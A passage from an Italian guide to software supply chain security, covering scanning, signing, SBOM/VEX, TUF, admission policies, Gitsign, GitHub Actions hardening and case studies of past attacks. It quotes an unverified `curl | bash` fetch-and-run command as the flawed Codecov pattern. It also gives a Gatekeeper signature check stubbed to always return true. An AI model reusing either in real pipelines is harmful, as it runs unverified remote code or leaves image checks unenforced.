  -H "Content-Type: multipart/form-data" \
  -F "project=${PROJECT_UUID}" \
  -F "bom=@sbom.cdx.json"
```

### VEX — Vulnerability Exploitability eXchange

VEX è un formato per comunicare lo stato di sfruttabilità delle vulnerabilità:

```json
{
  "bomFormat": "CycloneDX",
  "specVersion": "1.6",
  "vulnerabilities": [
    {
      "id": "CVE-2024-12345",
      "source": {
        "name": "NVD",
        "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-12345"
      },
      "analysis": {
        "state": "not_affected",
        "justification": "code_not_reachable",
        "detail": "La funzione vulnerabile non è invocata nel nostro codice."
      },
      "affects": [
        {
          "ref": "pkg:npm/lodash@4.17.20"
        }
      ]
    }
  ]
}
```

---

## Vulnerability scanning in CI/CD

### Strategie di scanning

| Fase | Tool | Scopo |
|---|---|---|
| **Pre-commit** | gitleaks, trufflehog | Secret detection |
| **Build** | trivy, grype | Vulnerability image/deps |
| **Registry** | Harbor scanner, ECR scan | Continuous monitoring |
| **Admission** | OPA/Gatekeeper, Kyverno | Policy enforcement |
| **Runtime** | Falco, KubeArmor | Behavior monitoring |

### Pipeline di scanning completa

```yaml
# GitHub Actions — scanning multi-fase
name: security-scan
on: [push, pull_request]

jobs:
  secret-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Secret detection
        uses: gitleaks/gitleaks-action@v2
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

  dependency-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Dependency vulnerability check
        run: |
          trivy fs --scanners vuln \
            --severity CRITICAL,HIGH \
            --exit-code 1 \
            --format table \
            .

  image-scan:
    runs-on: ubuntu-latest
    needs: [secret-scan, dependency-scan]
    steps:
      - uses: actions/checkout@v4

      - name: Build image
        run: docker build -t myapp:scan .

      - name: Scan con trivy
        run: |
          trivy image \
            --severity CRITICAL,HIGH \
            --exit-code 1 \
            --ignore-unfixed \
            --format sarif \
            --output trivy-results.sarif \
            myapp:scan

      - name: Upload SARIF
        uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: trivy-results.sarif
        if: always()

  iac-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: IaC security scan
        run: |
          trivy config \
            --severity CRITICAL,HIGH \
            --exit-code 1 \
            .

  license-check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: License compliance
        run: |
          trivy fs --scanners license \
            --severity CRITICAL,HIGH \
            --format table \
            .
```

### Policy di gate per vulnerability

```bash
# Script di gate — blocca deploy se vulnerabilità critiche
#!/usr/bin/env bash
set -euo pipefail

IMAGE="${1:?Specificare immagine}"
MAX_CRITICAL=0
MAX_HIGH=5

echo "Scanning ${IMAGE}..."
RESULT=$(trivy image --format json --severity CRITICAL,HIGH "${IMAGE}")

CRITICAL=$(echo "${RESULT}" | jq '[.Results[].Vulnerabilities[]? | select(.Severity=="CRITICAL")] | length')
HIGH=$(echo "${RESULT}" | jq '[.Results[].Vulnerabilities[]? | select(.Severity=="HIGH")] | length')

echo "Risultato: ${CRITICAL} CRITICAL, ${HIGH} HIGH"

if [ "${CRITICAL}" -gt "${MAX_CRITICAL}" ]; then
  echo "BLOCCATO: ${CRITICAL} vulnerabilità CRITICAL (max: ${MAX_CRITICAL})"
  exit 1
fi

if [ "${HIGH}" -gt "${MAX_HIGH}" ]; then
  echo "BLOCCATO: ${HIGH} vulnerabilità HIGH (max: ${MAX_HIGH})"
  exit 1
fi

echo "PASSATO: entro i limiti accettabili."
```

---

## Verifica degli artefatti

### Flusso di verifica end-to-end

```
Artefatto prodotto
       │
       ▼
┌──────────────┐
│ Firma cosign  │ ← Identità OIDC / KMS
└──────┬───────┘
       │
       ▼
┌──────────────┐
│ SBOM allegato │ ← syft / trivy
└──────┬───────┘
       │
       ▼
┌──────────────┐
│ Attestazioni  │ ← scan, provenance, compliance
└──────┬───────┘
       │
       ▼
┌──────────────┐
│ Rekor entry   │ ← Transparency log
└──────┬───────┘
       │
       ▼
┌──────────────┐
│ Verifica pre- │ ← Policy engine (Gatekeeper/Kyverno)
│ ammissione    │
└──────┬───────┘
       │
       ▼
   Deploy ✅
```

### Verifica completa con cosign

```bash
#!/usr/bin/env bash
set -euo pipefail

IMAGE="${1:?Specificare digest dell'immagine}"
IDENTITY_REGEXP="${2:-https://github.com/myorg/.*}"
OIDC_ISSUER="https://token.actions.githubusercontent.com"

echo "=== Verifica firma ==="
cosign verify \
  --certificate-identity-regexp "${IDENTITY_REGEXP}" \
  --certificate-oidc-issuer "${OIDC_ISSUER}" \
  "${IMAGE}"

echo "=== Verifica attestazione SBOM ==="
cosign verify-attestation \
  --type cyclonedx \
  --certificate-identity-regexp "${IDENTITY_REGEXP}" \
  --certificate-oidc-issuer "${OIDC_ISSUER}" \
  "${IMAGE}"

echo "=== Verifica attestazione vulnerability scan ==="
cosign verify-attestation \
  --type vuln \
  --certificate-identity-regexp "${IDENTITY_REGEXP}" \
  --certificate-oidc-issuer "${OIDC_ISSUER}" \
  "${IMAGE}"

echo "=== Verifica provenance SLSA ==="
slsa-verifier verify-image "${IMAGE}" \
  --source-uri "github.com/myorg/myrepo" \
  --builder-id "https://github.com/slsa-framework/slsa-github-generator/.github/workflows/generator_container_slsa3.yml@refs/tags/v2.1.0"

echo "Tutte le verifiche superate ✔"
```

---

## OCI artifacts e distribuzione

### OCI Distribution Specification

La specifica OCI Distribution permette di memorizzare artefatti generici (non solo container image) in un registry OCI-compatible:

- Firme cosign
- SBOM
- Attestazioni in-toto
- Helm chart
- File generici

### ORAS — OCI Registry As Storage

```bash
# Installare ORAS
brew install oras   # macOS
# oppure: curl -LO https://github.com/oras-project/oras/releases/download/v1.2.0/oras_1.2.0_linux_amd64.tar.gz

# Push di un artefatto generico
oras push myregistry.io/artifacts/policy:v1.0.0 \
  --artifact-type application/vnd.opa.policy \
  policy.rego:application/vnd.opa.rego

# Pull di un artefatto
oras pull myregistry.io/artifacts/policy:v1.0.0

# Attach di un artefatto a un'immagine (referrer)
oras attach myregistry.io/myapp:v1.0.0 \
  --artifact-type application/vnd.cyclonedx+json \
  sbom.cdx.json:application/vnd.cyclonedx+json

# Discover referrer di un'immagine
oras discover myregistry.io/myapp:v1.0.0

# Copy di artefatti tra registry
oras copy myregistry.io/myapp:v1.0.0 \
  otherregistry.io/myapp:v1.0.0
```

### Referrer API

A partire da OCI Distribution v1.1, i registry supportano la Referrer API per collegare artefatti (firme, SBOM, attestazioni) a un manifest specifico:

```
Image manifest (sha256:abc123)
├── cosign signature  (referrer, type: application/vnd.dev.cosign.artifact.sig.v1+json)
├── SBOM CycloneDX    (referrer, type: application/vnd.cyclonedx+json)
├── SLSA provenance   (referrer, type: application/vnd.in-toto+json)
└── VEX document      (referrer, type: application/vnd.csaf.vex+json)
```

---

## Notary v2

### Panoramica Notary v2

Notary v2 (ora chiamato "Notation") è il sistema di firma nativo della CNCF per artefatti OCI. Differenze rispetto a cosign:

| Aspetto | cosign | Notation (Notary v2) |
|---|---|---|
| **Modello di trust** | Transparency log (Rekor) | Trust policy locale |
| **Firma keyless** | Sì (OIDC/Fulcio) | No (richiede certificati) |
| **Tipo di firma** | Sigstore bundle | COSE Sign1 |
| **Storage** | OCI referrer o tag | OCI referrer |
| **Governance chiavi** | Fulcio CA o KMS | CA aziendale o plugin |
| **Uso tipico** | Open source, public supply chain | Enterprise, private supply chain |

### Utilizzo di Notation

```bash
# Installare Notation
brew install notation

# Generare chiave di test
notation cert generate-test --default "mycompany.io"

# Firmare un'immagine
notation sign myregistry.io/myapp@sha256:abc123...

# Verificare la firma
notation verify myregistry.io/myapp@sha256:abc123...

# Trust policy
cat > ~/.config/notation/trustpolicy.json <<EOF
{
  "version": "1.0",
  "trustPolicies": [
    {
      "name": "production-images",
      "registryScopes": ["myregistry.io/prod/*"],
      "signatureVerification": {
        "level": "strict"
      },
      "trustStores": ["ca:mycompany"],
      "trustedIdentities": ["x509.subject: C=IT, O=MyCompany, CN=release-signer"]
    }
  ]
}
EOF

# Plugin per AWS Signer
notation plugin install com.amazonaws.signer.notation.plugin \
  --url https://d2hvyiie56hcat.cloudfront.net/linux/amd64/notation-plugin.zip
```

---

## TUF — The Update Framework

### Cos'è TUF

TUF (The Update Framework) è un framework per la distribuzione sicura di aggiornamenti software. Protegge contro:

- **Arbitrary software attack:** installazione di software non autorizzato.
- **Rollback attack:** downgrade a versione vulnerabile.
- **Indefinite freeze attack:** mancata consegna di aggiornamenti.
- **Endless data attack:** download infinito per DoS.
- **Extraneous dependencies attack:** download di pacchetti non necessari.
- **Mix-and-match attack:** combinazione di versioni incompatibili.
- **Wrong software installation attack:** installazione del pacchetto sbagliato.
- **Malicious mirror attack:** mirror compromesso.

### Architettura TUF

```
┌────────────────────────────────────────┐
│              Root Metadata             │
│  (Chiavi offline, rotate raramente)    │
├────────────────────────────────────────┤
│                                        │
│  ┌─────────────┐  ┌────────────────┐   │
│  │  Targets    │  │  Snapshot      │   │
│  │  (Pacchetti │  │  (Versioni     │   │
│  │  disponibili│  │  correnti di   │   │
│  │  + hash)    │  │  tutti i meta) │   │
│  └─────────────┘  └────────────────┘   │
│                                        │
│  ┌─────────────┐                       │
│  │  Timestamp  │                       │
│  │  (Versione  │                       │
│  │  + scadenza │                       │
│  │  snapshot)  │                       │
│  └─────────────┘                       │
└────────────────────────────────────────┘
```

**Ruoli TUF:**

| Ruolo | Responsabilità | Chiavi |
|---|---|---|
| **Root** | Trust anchor, delega ai ruoli | Offline, multi-sig |
| **Targets** | Elenca i pacchetti disponibili e i loro hash | Online o offline |
| **Snapshot** | Versione corrente di tutti i target metadata | Online |
| **Timestamp** | Freshness check, previene freeze attack | Online, auto-rotated |

### TUF in sigstore

sigstore utilizza TUF per distribuire in modo sicuro le chiavi pubbliche e i certificati necessari per la verifica:

```bash
# cosign usa TUF internamente per ottenere
# - Chiave pubblica di Fulcio (root CA)
# - Chiave pubblica di Rekor (transparency log)
# - Chiave pubblica di CT Log

# Il root TUF di sigstore è integrato in cosign
# Aggiornamenti delle chiavi vengono distribuiti tramite TUF
# senza richiedere aggiornamento del client

# Inizializzare TUF root personalizzato
cosign initialize --mirror https://tuf.example.com --root root.json
```

### python-tuf — implementazione di riferimento

```python
# Esempio semplificato di repository TUF
from tuf.api.metadata import (
    Root, Targets, Snapshot, Timestamp, Metadata
)
from securesystemslib.signer import CryptoSigner
from datetime import datetime, timedelta, timezone

# Creare metadata root
root = Root(expires=datetime.now(timezone.utc) + timedelta(days=365))

# Aggiungere ruoli e chiavi
# (semplificato — in produzione usare chiavi offline per root)
root.add_key(targets_key, "targets")
root.add_key(snapshot_key, "snapshot")
root.add_key(timestamp_key, "timestamp")

# Creare metadata targets
targets = Targets(expires=datetime.now(timezone.utc) + timedelta(days=30))
targets.targets["myapp-v1.0.0.tar.gz"] = {
    "length": 12345,
    "hashes": {
        "sha256": "abc123..."
    }
}
```

---

## Analisi di attacchi alla supply chain

### SolarWinds (2020)

**Vettore:** Compromissione del build system di SolarWinds. Codice malevolo inserito nel processo di build di Orion, non nel repository sorgente.

**Impatto:** ~18.000 organizzazioni hanno installato l'aggiornamento compromesso, inclusi agenzie governative USA.

**Lezioni:**

| Lezione | Controllo SLSA |
|---|---|
| Il build system è un target primario | SLSA L3: build isolato |
| Il codice nel repository era pulito | SLSA L4: build hermetico e riproducibile |
| Nessuna verifica dell'output del build | Firma + verifica dell'artefatto |
| Un singolo attaccante ha compromesso l'intera catena | Separation of duties, two-party review |

**Mitigazione con SLSA Level 3+:**
```
Se SolarWinds avesse implementato SLSA L3:
1. Build su piattaforma isolata → il codice malevolo non sarebbe
   stato iniettato nel build process
2. Provenance non-falsifiable → la provenance avrebbe mostrato
   che il build non corrispondeva al codice nel repository
3. Verifica dell'artefatto → i clienti avrebbero potuto verificare
   che l'artefatto corrispondesse alla provenance
```

### Codecov (2021)

**Vettore:** Modifica dello script di upload di Codecov (`bash <(curl -s https://codecov.io/bash)`). L'attaccante ha modificato lo script per esfiltrare variabili d'ambiente (inclusi secret CI) dai sistemi dei clienti.

**Impatto:** Migliaia di CI pipeline hanno eseguito lo script compromesso, esponendo secret, token e credenziali.

**Lezioni:**

| Lezione | Controllo |
|---|---|
| `curl | bash` non verifica l'integrità | SRI / checksum verification |
| Script esterno con accesso ai secret CI | Least privilege, sandboxing |
| Nessun alert sulla modifica dello script | Integrity monitoring, pinning |
| Secret esposti nelle variabili d'ambiente | Secret injection sicura, vault |

**Mitigazione:**
```bash
# SBAGLIATO — no verifica integrità
bash <(curl -s https://codecov.io/bash)

# CORRETTO — pin versione + verifica checksum
curl -Os https://codecov.io/bash
curl -Os https://codecov.io/bash.SHA256SUM
sha256sum -c bash.SHA256SUM
bash bash

# MEGLIO — usare action ufficiale pinned al digest
- uses: codecov/codecov-action@e28ff129e5465c2c0dcc6f003fc735cb6ae0c673 # v4.5.0
```

### event-stream (2018)

**Vettore:** Social engineering del maintainer di `event-stream` (pacchetto npm con ~2M download/settimana). Un nuovo maintainer ha aggiunto la dipendenza `flatmap-stream` contenente codice malevolo che rubava Bitcoin wallet.

**Impatto:** Tutti i progetti che dipendevano da event-stream hanno ricevuto il codice malevolo come dipendenza transitiva.

**Lezioni:**

| Lezione | Controllo |
|---|---|
| Trust nei maintainer NPM | Verifica identità, 2FA obbligatoria |
| Dipendenze transitive non monitorate | SBOM + scansione ricorsiva |
| Codice offuscato in dipendenza | Static analysis, code review deps |
| Package manager come vettore | Lock file, reproducible installs |

### Dependency confusion / Namespace attacks

**Vettore:** Un attaccante pubblica un pacchetto su un registry pubblico con lo stesso nome di un pacchetto interno privato, ma con versione più alta.

**Mitigazione:**

```
# npm — configurare scope per registry privato
@mycompany:registry=https://npm.mycompany.io/
registry=https://registry.npmjs.org/

# pip — disabilitare PyPI per pacchetti interni
pip install --index-url https://pypi.mycompany.io/simple/ \
  --no-deps \
  my-internal-package

# Preventivo: usare namespace/scope per TUTTI i pacchetti interni
# @mycompany/utils invece di utils
```

### xz utils backdoor (2024)

**Vettore:** Un contributore di lunga data di xz utils ha introdotto gradualmente una backdoor nelle versioni 5.6.0 e 5.6.1. La backdoor comprometteva OpenSSH attraverso la catena di dipendenze systemd → liblzma.

**Lezioni:**

| Lezione | Controllo |
|---|---|
| Maintainer trust a lungo termine | Periodic review, rotation |
| Backdoor introdotta incrementalmente | Audit dei commit, diff review |
| Build non riproducibile nascondeva differenze | SLSA L4: build riproducibili |
| Dipendenza indiretta (systemd → liblzma → OpenSSH) | SBOM + analisi transitiva |

---

## Policy engine — OPA/Gatekeeper per admission control

### Gatekeeper per Kubernetes

Gatekeeper è l'integrazione di Open Policy Agent (OPA) per Kubernetes, implementata come admission controller webhook. Permette di definire policy che bloccano il deploy di risorse non conformi.

### Policy: solo immagini firmate

```yaml
# ConstraintTemplate — verifica firma cosign
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8srequireimagecosignsign
spec:
  crd:
    spec:
      names:
        kind: K8sRequireImageCosignSign
      validation:
        openAPIV3Schema:
          type: object
          properties:
            allowedRegistries:
              type: array
              items:
                type: string
            cosignIdentityRegexp:
              type: string
            cosignOIDCIssuer:
              type: string
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package k8srequireimagecosignsign

        violation[{"msg": msg}] {
          container := input.review.object.spec.containers[_]
          not image_signed(container.image)
          msg := sprintf("Immagine %v non firmata o firma non valida", [container.image])
        }

        violation[{"msg": msg}] {
          container := input.review.object.spec.initContainers[_]
          not image_signed(container.image)
          msg := sprintf("Init container %v: immagine non firmata", [container.image])
        }

        image_signed(image) {
          # Verifica tramite external data provider
          # o cosign verify come webhook esterno
          true
        }
```

```yaml
# Constraint — applicazione della policy
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sRequireImageCosignSign
metadata:
  name: require-signed-images
spec:
  match:
    kinds:
      - apiGroups: [""]
        kinds: ["Pod"]
    namespaces: ["production", "staging"]
  parameters:
    allowedRegistries:
      - "ghcr.io/myorg/*"
      - "myregistry.io/prod/*"
    cosignIdentityRegexp: "https://github.com/myorg/.*"
    cosignOIDCIssuer: "https://token.actions.githubusercontent.com"
```

### Kyverno — alternativa a Gatekeeper

```yaml
# Kyverno — verify image signature
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: verify-image-signature
spec:
  validationFailureAction: Enforce
  webhookTimeoutSeconds: 30
  rules:
    - name: verify-cosign-signature
      match:
        any:
          - resources:
              kinds:
                - Pod
              namespaces:
                - production
                - staging
      verifyImages:
        - imageReferences:
            - "ghcr.io/myorg/*"
            - "myregistry.io/prod/*"
          attestors:
            - entries:
                - keyless:
                    subject: "https://github.com/myorg/*"
                    issuer: "https://token.actions.githubusercontent.com"
                    rekor:
                      url: https://rekor.sigstore.dev

    - name: require-sbom-attestation
      match:
        any:
          - resources:
              kinds:
                - Pod
              namespaces:
                - production
      verifyImages:
        - imageReferences:
            - "ghcr.io/myorg/*"
          attestations:
            - type: https://cyclonedx.org/bom
              conditions:
                all:
                  - key: "{{ bomFormat }}"
                    operator: Equals
                    value: "CycloneDX"

    - name: no-critical-vulnerabilities
      match:
        any:
          - resources:
              kinds:
                - Pod
              namespaces:
                - production
      verifyImages:
        - imageReferences:
            - "ghcr.io/myorg/*"
          attestations:
            - type: https://cosign.sigstore.dev/attestation/vuln/v1
              conditions:
                all:
                  - key: "{{ scanner }}"
                    operator: Equals
                    value: "trivy"
                  - key: "{{ result.critical }}"
                    operator: Equals
                    value: 0
```

### Policy di supply chain con Connaisseur

```yaml
# Connaisseur — image admission controller
# validators.yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: connaisseur-config
data:
  validators.yaml: |
    validators:
      - name: sigstore
        type: cosign
        trustRoots:
          - name: default
            key: |
              -----BEGIN PUBLIC KEY-----
              MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE...
              -----END PUBLIC KEY-----

    policy:
      - pattern: "ghcr.io/myorg/*"
        validator: sigstore
        with:
          trustRoot: default
      - pattern: "*"
        validator: deny
```

---

## Architettura end-to-end di una pipeline sicura

### Pipeline completa: dal commit al deploy

```
┌──────────────────────────────────────────────────────────────┐
│                        DEVELOPER                             │
│  git commit → pre-commit hooks → push                        │
│  [gitleaks: secret scan] [commitlint: format]                │
└──────────────┬───────────────────────────────────────────────┘
               │
               ▼
┌──────────────────────────────────────────────────────────────┐
│                     CI/CD (GitHub Actions)                    │
│                                                              │
│  1. Checkout (verified commit)                               │
│  2. Dependency scan (trivy fs)                               │
│  3. SAST (semgrep/codeql)                                    │
│  4. Build (docker build)                                     │
│  5. Image scan (trivy image)                                 │
│  6. SBOM generation (syft)                                   │
│  7. SBOM attestation (cosign attest --type cyclonedx)        │
│  8. Vulnerability attestation (cosign attest --type vuln)    │
│  9. Image sign (cosign sign --keyless)                       │
│ 10. SLSA provenance (slsa-github-generator)                  │
│ 11. Push to registry                                         │
└──────────────┬───────────────────────────────────────────────┘
               │
               ▼
┌──────────────────────────────────────────────────────────────┐
│                     OCI REGISTRY                             │
│                                                              │
│  Image manifest ──┬── cosign signature (referrer)            │
│                   ├── SBOM CycloneDX (referrer)              │
│                   ├── Vuln attestation (referrer)            │
│                   └── SLSA provenance (referrer)             │
└──────────────┬───────────────────────────────────────────────┘
               │
               ▼
┌──────────────────────────────────────────────────────────────┐
│              KUBERNETES ADMISSION CONTROL                    │
│                                                              │
│  Kyverno / Gatekeeper verifica:                              │
│  ✓ Immagine firmata con identità valida                      │
│  ✓ SBOM attestation presente                                 │
│  ✓ Nessuna vulnerabilità CRITICAL                            │
│  ✓ Provenance SLSA L2+ verificata                            │
│  ✓ Immagine da registry autorizzato                          │
└──────────────┬───────────────────────────────────────────────┘
               │
               ▼
┌──────────────────────────────────────────────────────────────┐
│                     RUNTIME                                  │
│                                                              │
│  Falco: monitoring comportamentale                           │
│  Continuous scanning: registry re-scan periodico             │
│  Dependency-Track: SBOM lifecycle management                 │
└──────────────────────────────────────────────────────────────┘
```

---

## Gitsign — Firma keyless dei commit Git

### Panoramica di Gitsign

Gitsign estende l'ecosistema sigstore alla firma dei commit Git. Sostituisce la tradizionale firma GPG con certificati X.509 short-lived emessi da Fulcio, legati all'identita OIDC dello sviluppatore. Ogni firma viene registrata nel transparency log Rekor, garantendo non-repudiation senza la complessita della gestione di chiavi GPG long-lived.

**Vantaggi rispetto a GPG:**

| Aspetto | GPG tradizionale | Gitsign (sigstore) |
|---|---|---|
| **Gestione chiavi** | Generazione, backup, rotazione, distribuzione | Nessuna chiave da gestire |
| **Identita** | Key ID opaco | Email/OIDC identity verificabile |
| **Revoca** | Revocation certificate manuale | Certificati short-lived (~10 min) |
| **Auditabilita** | Nessun log centralizzato | Ogni firma registrata in Rekor |
| **Onboarding** | Complesso (keygen, publish, trust) | `brew install gitsign` + OIDC login |
| **CI/CD** | Secret GPG key nel CI | OIDC ambient credentials |

### Installazione e configurazione

```bash
# Installazione
brew install gitsign          # macOS
go install github.com/sigstore/gitsign@latest  # Go

# Configurazione per un singolo repository
cd /path/to/repo
git config --local commit.gpgsign true
git config --local tag.gpgsign true
git config --local gpg.x509.program gitsign
git config --local gpg.format x509

# Configurazione globale (tutti i repository)
git config --global commit.gpgsign true
git config --global tag.gpgsign true
git config --global gpg.x509.program gitsign
git config --global gpg.format x509

# Configurare il connector OIDC (opzionale)
# Default: sigstore public instance
git config --local gitsign.connectorID https://accounts.google.com
# Oppure per GitHub:
git config --local gitsign.connectorID https://github.com/login/oauth
```

### Flusso di firma di un commit

```
Sviluppatore esegue `git commit`
       │
       ▼
Gitsign intercetta la firma
       │
       ▼
Browser si apre per autenticazione OIDC
(GitHub, Google, Microsoft)
       │
       ▼
Gitsign genera chiave ephemeral
       │
       ▼
Fulcio emette certificato X.509
(contiene email/identity nel SAN)
       │
       ▼
Commit firmato con certificato
       │
       ▼
Firma registrata in Rekor
       │
       ▼
Certificato scade dopo ~10 min
(ma la prova di firma resta in Rekor per sempre)
```

### Verifica dei commit firmati con Gitsign

```bash
# Verifica base con git
git verify-commit HEAD
# Output:
# tlog index: 12345678
# gitsign: Signature made using certificate ID: user@example.com
# gitsign: Good signature from [user@example.com]

# Verifica con gitsign CLI — specificare issuer e identity
gitsign verify \
  --certificate-identity "user@example.com" \
  --certificate-oidc-issuer "https://accounts.google.com" \
  HEAD

# Verifica di un range di commit
for commit in $(git rev-list main..feature-branch); do
  echo "Verifying ${commit}..."
  gitsign verify \
    --certificate-identity-regexp ".*@myorg\.com" \
    --certificate-oidc-issuer "https://accounts.google.com" \
    "${commit}"
done
```

### Gitsign in CI/CD (GitHub Actions)

```yaml
name: verify-commits
on: [pull_request]

permissions:
  id-token: write
  contents: read

jobs:
  verify:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Install gitsign
        run: |
          wget -qO- https://github.com/sigstore/gitsign/releases/download/v0.11.0/gitsign_0.11.0_linux_amd64.tar.gz | tar xz
          sudo mv gitsign /usr/local/bin/

      - name: Verify all PR commits are signed
        run: |
          BASE_SHA=${{ github.event.pull_request.base.sha }}
          HEAD_SHA=${{ github.event.pull_request.head.sha }}
          for commit in $(git rev-list ${BASE_SHA}..${HEAD_SHA}); do
            echo "Verifying commit ${commit}..."
            gitsign verify \
              --certificate-identity-regexp '.*@myorg\.com' \
              --certificate-oidc-issuer 'https://accounts.google.com' \
              "${commit}" || exit 1
          done
          echo "All commits verified."
```

### Gitsign e GitHub commit verification

GitHub supporta la visualizzazione dello stato di verifica per i commit firmati con Gitsign. Per abilitare la verifica nel contesto di un'organizzazione GitHub:

```bash
# Configurare Gitsign per usare GitHub come OIDC provider
git config --local gitsign.connectorID https://github.com/login/oauth

# I commit firmati con Gitsign appaiono come "Verified"
# nella UI di GitHub se l'identita OIDC corrisponde
# all'account GitHub dell'autore del commit

# Verificare localmente un commit firmato da un collega
gitsign verify \
  --certificate-identity "colleague@myorg.com" \
  --certificate-oidc-issuer "https://github.com/login/oauth" \
  abc123def

# Batch verification di tutti i commit di un branch
git log --format='%H' main..HEAD | while read hash; do
  result=$(gitsign verify \
    --certificate-identity-regexp '.*@myorg\.com' \
    --certificate-oidc-issuer 'https://github.com/login/oauth' \
    "${hash}" 2>&1)
  echo "${hash}: ${result}"
done
```

**Integrazione con branch protection rules:**

GitHub permette di richiedere commit firmati tramite branch protection. Con Gitsign configurato come provider di firma, tutti i commit che non hanno una firma valida vengono rifiutati dal push al branch protetto. Questo garantisce che ogni commit nel branch di produzione sia attribuibile a un'identita OIDC verificata.

### Confronto tra metodi di firma dei commit

| Metodo | Complessita setup | Gestione chiavi | Verifica offline | Transparency log | Supporto GitHub |
|---|---|---|---|---|---|
| **GPG** | Alta | Manuale (keygen, trust, revoke) | Si | No | Si (Verified badge) |
| **SSH** | Media | Manuale (keygen, distribuzione) | Si | No | Si (Verified badge) |
| **Gitsign** | Bassa | Nessuna (keyless) | No (richiede Rekor) | Si (Rekor) | Si (Verified badge) |
| **S/MIME** | Alta | Certificati CA aziendale | Si | No | Si (Verified badge) |

La scelta dipende dall'ambiente: Gitsign e ideale per team distribuiti e open source grazie all'assenza di gestione chiavi. GPG e SSH sono preferibili per ambienti air-gapped dove non c'e accesso ai servizi sigstore.

### Gitsign con istanza sigstore privata

Per ambienti enterprise o air-gapped, Gitsign supporta istanze sigstore private:

```bash
# Configurare Fulcio e Rekor privati
git config --local gitsign.fulcio https://fulcio.internal.example.com
git config --local gitsign.rekor https://rekor.internal.example.com
git config --local gitsign.issuer https://idp.internal.example.com

# Inizializzare TUF root personalizzato per la verifica
cosign initialize --mirror https://tuf.internal.example.com --root root.json
```

---

## Sicurezza di GitHub Actions

### Superficie d'attacco di GitHub Actions

GitHub Actions rappresenta un componente critico della supply chain. I runner eseguono codice arbitrario con accesso a secret, token OIDC e artefatti di build. Le principali superfici d'attacco includono:

```
Attacco                          Vettore
─────────────────────────────────────────────────────────
Action compromise               Tag mutabili puntati a commit malevoli
Workflow injection               Input non sanitizzato in run: steps
Secret exfiltration              Fork PR con workflow modificato
OIDC token theft                 Claim troppo ampio nella trust policy
Artifact poisoning               Upload di artefatti malevoli tra job
Cache poisoning                  Manipolazione della cache di build
Self-hosted runner persistence   Malware persistente su runner non-ephemeral
Dependency confusion in Actions  action con namespace squattato
```

### Pinning delle Actions al commit SHA

Il pinning delle action al digest SHA completo e l'unico modo per usare un'action come release immutabile. Il pinning a tag (come `@v4`) e vulnerabile: un attaccante che compromette il repository dell'action puo spostare il tag su un commit malevolo.

**Incidente trivy-action (marzo 2025):**

Nel marzo 2025, un attaccante ha re-puntato 76 dei 77 tag di versione di `aquasecurity/trivy-action` a commit malevoli contenenti un infostealer. Ogni workflow che referenziava quei tag per nome ha eseguito automaticamente il codice malevolo. Solo i workflow che usavano il pinning al SHA completo sono rimasti protetti.

```yaml
# VULNERABILE — tag mutabile
- uses: aquasecurity/trivy-action@v0.24.0

# SICURO — pinned al commit SHA completo
- uses: aquasecurity/trivy-action@a17da33c3b9b7de7e468e4cb9d1d79aa4b282a11 # v0.24.0

# NOTA: il commento con la versione e per leggibilita, non ha effetto sul pinning
```

**Enforcement organizzativo del SHA pinning (da agosto 2025):**

GitHub supporta il SHA pinning enforcement a livello di organizzazione. I workflow che usano action non pinnate falliscono automaticamente. E possibile anche bloccare action specifiche tramite il prefisso `!`:

```yaml
# Configurazione organizzativa
# Settings > Actions > General > Action permissions
# "Allow select actions and reusable workflows"
# Require SHA pinning: ON
# Blocked actions: !compromised-org/action
```

**Automazione del pinning con strumenti:**

```bash
# pin-github-action — aggiorna automaticamente i riferimenti
npx pin-github-action .github/workflows/*.yml

# Renovate puo mantenere i pin aggiornati automaticamente
# renovate.json:
# {
#   "github-actions": {
#     "enabled": true,
#     "pinDigests": true
#   }
# }
```

### OIDC per GitHub Actions

L'OIDC (OpenID Connect) consente ai workflow di autenticarsi direttamente con cloud provider e servizi senza secret long-lived. Il token OIDC emesso da GitHub contiene claim verificabili sull'identita del workflow.

**Claim principali del token OIDC:**

| Claim | Esempio | Uso |
|---|---|---|
| `sub` | `repo:org/repo:ref:refs/heads/main` | Identifica il repository e il branch |
| `repository` | `org/repo` | Repository che ha attivato il workflow |
| `repository_owner` | `org` | Organizzazione proprietaria |
| `workflow` | `.github/workflows/deploy.yml` | Workflow specifico |
| `ref` | `refs/heads/main` | Branch o tag |
| `environment` | `production` | Environment GitHub configurato |
| `job_workflow_ref` | `org/repo/.github/workflows/reusable.yml@refs/tags/v1` | Ref del reusable workflow |

**Configurazione della trust policy con granularita:**

```bash
# AWS — IAM role trust policy granulare
# Accettare solo da repository specifico + branch main + environment production
{
  "Condition": {
    "StringEquals": {
      "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
      "token.actions.githubusercontent.com:sub": "repo:myorg/myrepo:environment:production"
    }
  }
}

# SBAGLIATO — troppo ampio, qualsiasi repo nell'org puo assumere il ruolo
# "StringLike": { "sub": "repo:myorg/*" }
```

**Best practice per OIDC:**

- Restringere i claim al repository, branch e environment specifici.
- Usare `environment` di GitHub come condizione per separare staging da production.
- Per reusable workflow, usare il claim `job_workflow_ref` per garantire che solo workflow verificati possano richiedere token.
- Mai usare `StringLike` con wildcard ampi su `sub`.

### GitHub Artifact Attestation

Da 2024, GitHub supporta nativamente le attestazioni per artefatti di build. Il sistema utilizza sigstore internamente e genera provenance SLSA v1.0 Build Level 2.

```yaml
# GitHub Actions — artifact attestation nativa
name: build-attest
on:
  push:
    tags: ['v*']

permissions:
  id-token: write        # per mintare il token OIDC sigstore
  contents: read
  attestations: write    # per persistere l'attestazione
